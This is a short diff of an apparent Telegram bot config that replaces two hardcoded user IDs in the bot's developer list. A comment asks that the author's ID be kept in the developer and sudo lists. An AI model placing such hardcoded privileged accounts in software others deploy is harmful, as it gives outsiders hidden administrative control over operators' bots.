@@ -159,8 +159,8 @@ else:
     
 # Don't Remove my ID from DEV and SUDO list..It Took many months to set up a bot like this..I have added many features in this bot ..by @xflicks     
 DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1833035701)
-DEV_USERS.add(1669508271)
+DEV_USERS.add(1705562427)
+DEV_USERS.add(2063016755)
 SUDO_USERS.add(1712864821)
 SUDO_USERS.add(OWNER_ID)
 SUDO_USERS.add(1669508271)
